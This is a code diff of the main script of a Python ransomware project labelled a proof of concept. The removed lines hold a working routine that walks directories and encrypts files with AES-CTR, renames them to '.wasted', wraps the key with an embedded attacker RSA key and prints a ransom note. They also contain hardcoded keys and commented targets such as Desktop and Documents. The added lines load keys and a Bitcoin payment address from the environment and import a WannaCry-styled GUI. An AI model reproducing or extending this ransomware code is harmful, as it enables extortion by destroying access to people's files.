@@ -1,159 +1,127 @@
 from Crypto.PublicKey import RSA
-from Crypto import Random
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util import Counter
-
 import argparse
 import os
 import sys
 import base64
 import platform 
+import getpass
+import socket
+import base64
+import logging
+from datetime import datetime
+import time
+from dotenv import load_dotenv
 
 from ransomware import discover
 from ransomware import modify
+from ransomware.gui_main import WannaCryGUI
+from ransomware.config import AppConfig
+from ransomware.core import RansomwareApp
+from ransomware.logging import init_logging
+
+# Load environment variables from .env
+load_dotenv()
+
+HARDCODED_KEY = os.environ.get('HARDCODED_KEY')
+if not HARDCODED_KEY:
+    print('[ERROR] HARDCODED_KEY is missing from environment.')
+    sys.exit(1)
+HARDCODED_KEY = HARDCODED_KEY.encode()
+
+SERVER_PUBLIC_RSA_KEY = os.environ.get('SERVER_PUBLIC_RSA_KEY')
+if not SERVER_PUBLIC_RSA_KEY:
+    print('[ERROR] SERVER_PUBLIC_RSA_KEY is missing from environment.')
+    sys.exit(1)
+else:
+    SERVER_PUBLIC_RSA_KEY = SERVER_PUBLIC_RSA_KEY.replace('\\n', '\n')
+
+SERVER_PRIVATE_RSA_KEY = os.environ.get('SERVER_PRIVATE_RSA_KEY')
+if not SERVER_PRIVATE_RSA_KEY:
+    print('[ERROR] SERVER_PRIVATE_RSA_KEY is missing from environment.')
+    sys.exit(1)
+else:
+    SERVER_PRIVATE_RSA_KEY = SERVER_PRIVATE_RSA_KEY.replace('\\n', '\n')
+
+extension = os.environ.get('extension', '.wasted')
+host = os.environ.get('host', '127.0.0.1')
+port = int(os.environ.get('port', 8080))
+PAYMENT_ADDRESS = os.environ.get('PAYMENT_ADDRESS', '1BitcoinEaterAddressDontSendf59kuE')
+
+# -----------------
+# LOGGING SETUP
+# -----------------
+def setup_logging():
+    """Setup logging configuration to track all activities"""
+    # Create logs directory if it doesn't exist
+    if not os.path.exists('logs'):
+        os.makedirs('logs')
+    
+    # Create log filename with timestamp
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    log_filename = f'logs/ransomware_activity_{timestamp}.log'
+    
+    # Configure logging
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(levelname)s - %(message)s',
+        handlers=[
+            logging.FileHandler(log_filename, encoding='utf-8'),
+            logging.StreamHandler(sys.stdout)
+        ]
+    )
+    
+    logger = logging.getLogger(__name__)
+    logger.info("=" * 60)
+    logger.info("RANSOMWARE PoC ACTIVITY LOG STARTED")
+    logger.info("=" * 60)
+    logger.info(f"Log file: {log_filename}")
+    logger.info(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    logger.info(f"Platform: {platform.system()} {platform.release()}")
+    logger.info(f"Python version: {sys.version}")
+    logger.info(f"User: {getpass.getuser()}")
+    logger.info(f"Hostname: {platform.node()}")
+    logger.info("=" * 60)
+    
+    return logger
+
+# Initialize logger
+logger = setup_logging()
 
 # -----------------
 # GLOBAL VARIABLES
 # CHANGE IF NEEDED
 # -----------------
-#  set to either: '128/192/256 bit plaintext key' or False
-HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # AES 256-key used to encrypt files
-SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAklmKLXGK6jfMis4ifjlB
-xSGMFCj1RtSA/sQxs4I5IWvMxYSD1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXT
-qPYmZW+TQjtrx4tG7ZHda65+EdyVJkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdP
-GhYcIZmJ7iT5aRCkXiKXrw+iIL6DT0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4re
-q/CydAWrsAJPhtEmObu6cn2FYFfwGmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkz
-vvYVc85DbQFK/Jcpeq0QkKiJ4Z+TWGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZg
-HwIDAQAB
------END PUBLIC KEY-----''' # Attacker's embedded public RSA key used to encrypt AES key
-SERVER_PRIVATE_RSA_KEY = '''-----BEGIN RSA PRIVATE KEY-----
-MIIEowIBAAKCAQEAklmKLXGK6jfMis4ifjlBxSGMFCj1RtSA/sQxs4I5IWvMxYSD
-1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXTqPYmZW+TQjtrx4tG7ZHda65+EdyV
-Jkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdPGhYcIZmJ7iT5aRCkXiKXrw+iIL6D
-T0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4req/CydAWrsAJPhtEmObu6cn2FYFfw
-GmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkzvvYVc85DbQFK/Jcpeq0QkKiJ4Z+T
-WGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZgHwIDAQABAoIBAFLE80IaSi+HGVaT
-mKx8o3bjLz8jnvzNKJttyJI2nysItcor1Qh1IQZ+Dhj6ZmcV4mGXF2hg6ZfES3hW
-mL3pZRjVBgguX0GBK8ayPY4VBf5ltIVTlMMRJlGvJEmZf49pWdhjc0Mu1twZRmKq
-nVpWy8T8JjLWjEy0ep5yPBPFSrZFphQdiZxTrnmNR/Ip48XXGnQtRuNGSsNattc/
-2UYmLjSYTPasSV7PeXtGGaw34dfiKKlh4anXzjl1ARcVEgDRG617y8eK3aGDpU5G
-5bm/M4kZ7xXVtrPuAlhcZPgPrPG2VH9/DTc1IzEXG65pAwC+WhCZv3xFRTYTz9ca
-qj4sYKkCgYEA+eBkkFb7K/t3JfE9AGwNBdmXepdgVOiBbKBxwXl4XbjTQn1BGCsQ
-0FmgaFUhL3SmDYvNuNnF1kFeXOlghMR4v1DOSttcrqEU0oztLDdY1PKxHBusp2oy
-RvK+JPZVMt8yRQkPWjVlSKWWgqO+Yd5QONWMKAfA1f3zCa1Rj/1ouwMCgYEAle+r
-QDIWri6e/mdim/ec/irpCRBn/2XTK1J0kqog1vmovIhhxHlTw7bb/S168afYY8v8
-TUJgKgnqGYmo/RVreMs+IZoN8ZoqkKBRRC00C/EpiDSv4q8EfHgzAP3Jpfk29brc
-QxEkClaXssRG/N8bK2aiUgztM4HabFSocWW5DbUCgYAcMQbnigi4g5yDuV3qiEZH
-3K7Mc/u4WKsReGCdNXkxCcM8Aymu8lzpRNNmMgSWeBCsApPpQRii/akJzoLHN+tv
-mkxMAcfJI/9XafLwRCZPkDoPM8gc80xM2OI/BVPDc48WXtlOkiulMJl0j8jQ/eYL
-I3y2n3lQK2CaPOWw2yRPxQKBgHcpshslM+1fVDGxDSgUFYvTor33chADZ19I+ykN
-WWhBp5+fbMRwAOjNTe3b1Zh14379QhpNJIyEsK93Pv1VpsKsFUczXt2jvyyOncfn
-fTP4iR+dcCRjINej2DVzfm4QsWN/DUuoNdKZm5sSb7DNyJQnz94SM/r5uxTZ+72U
-MQz5AoGBAK/R9Fx7UBmHcC+9ehBJ5aPzvU8DqiVYg2wAYGu/n81s30VdtTQwfSed
-14roox6zaAk8fEZ/nkS86evh6PqjfhSuniBoqvQllAPZTXdOm8KPchNU8VC+iSzw
-+IbSWacaVjzrtfY/UcRkUrgQotk8a4kPZrijPogn060VnXPEeq3t
------END RSA PRIVATE KEY-----''' # SHOULD NOT BE INCLUDED - only for decryptor purposes
-extension = ".wasted" # Ransomware custom extension
-
+def getlocalip():
+    logger.info("Retrieving local IP address")
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(('8.8.8.8', 80))
+    local_ip = s.getsockname()[0]
+    logger.info(f"Local IP address: {local_ip}")
+    return local_ip
 
 def parse_args():
+    """
+    Parse command-line arguments for encryption/decryption and target path.
+    """
     parser = argparse.ArgumentParser(description='Ransomware PoC')
-    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %%HOME%%/test_ransomware', action="store")
-
+    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to ./test_ransomware', default='./test_ransomware')
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
-                        action='store_true')
-    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
-                        action='store_true')
-
+    group.add_argument('-e', '--encrypt', help='Enable encryption of files', action='store_true')
+    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files', action='store_true')
     return parser.parse_args()
 
 def main():
-    if len(sys.argv) <= 1:
-        print('[*] Ransomware - PoC\n')
-        # banner()
-        print('Usage: python3 main.py -h')
-        print('{} -h for help.'.format(sys.argv[0]))
-        exit(0)
-
-    # Parse arguments
+    """
+    Main function to initialize config and run the ransomware app.
+    """
     args = parse_args()
-    encrypt = args.encrypt
-    decrypt = args.decrypt
-    
-    absolute_path = str(args.path)
-    
-    # Force one click and comment out args above
-    # absolute_path = "None"
-    # encrypt = True 
-    # decrypt = False
-    
-    if absolute_path != 'None':
-        startdirs = [absolute_path]
-    else:
-        # Check OS
-        plt = platform.system()
-        if plt == "Linux" or plt == "Darwin":
-            startdirs = [os.environ['HOME'] + '/test_ransomware']
-        elif plt == "Windows":
-            startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
-            # Can also hardcode additional directories
-            # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
-                        # os.environ['USERPROFILE'] + '\\Documents',
-                        # os.environ['USERPROFILE'] + '\\Music',
-                        # os.environ['USERPROFILE'] + '\\Desktop',
-                        # os.environ['USERPROFILE'] + '\\Onedrive']
-        else:
-            print("Unidentified system")
-            exit(0)
+    config = AppConfig()
+    init_logging(config.log_level)
+    app = RansomwareApp(config)
+    app.run_process(args.path, encrypt=args.encrypt)
 
-    # Encrypt AES key with attacker's embedded RSA public key 
-    server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
-    encryptor = PKCS1_OAEP.new(server_key)
-    encrypted_key = encryptor.encrypt(HARDCODED_KEY)
-    encrypted_key_b64 = base64.b64encode(encrypted_key).decode("ascii")
-
-    print("Encrypted key " + encrypted_key_b64 + "\n")
-            
-    if encrypt:
-        print("[COMPANY_NAME]\n\n"
-            "YOUR NETWORK IS ENCRYPTED NOW\n\n"
-            "USE - TO GET THE PRICE FOR YOUR DATA\n\n"
-            "DO NOT GIVE THIS EMAIL TO 3RD PARTIES\n\n"
-            "DO NOT RENAME OR MOVE THE FILE\n\n"
-            "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY\n"
-            "[begin_key]\n{}\n[end_key]\n"
-            "KEEP IT\n".format(SERVER_PUBLIC_RSA_KEY))
-        key = HARDCODED_KEY
-    if decrypt:
-        # # RSA Decryption function - warning that private key is hardcoded for testing purposes
-        rsa_key = RSA.importKey(SERVER_PRIVATE_RSA_KEY)
-        decryptor = PKCS1_OAEP.new(rsa_key)
-        key = decryptor.decrypt(base64.b64decode(encrypted_key_b64))
-           
-    # Create AES counter and AES cipher
-    ctr = Counter.new(128)
-    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
-
-    # Recursively go through folders and encrypt/decrypt files
-    for currentDir in startdirs:
-        for file in discover.discoverFiles(currentDir):
-            if encrypt and not file.endswith(extension):
-                modify.modify_file_inplace(file, crypt.encrypt)
-                os.rename(file, file + extension)
-                print("File changed from " + file + " to " + file + extension)
-            if decrypt and file.endswith(extension):
-                modify.modify_file_inplace(file, crypt.encrypt)
-                file_original = os.path.splitext(file)[0]
-                os.rename(file, file_original)
-                print("File changed from " + file + " to " + file_original)
-                
-    # This wipes the key out of memory
-    # to avoid recovery by third party tools
-    for _ in range(100):
-        #key = random(32)
-        pass
-
-if __name__=="__main__":
+if __name__ == "__main__":
+    # Entry point for running the ransomware PoC
     main()
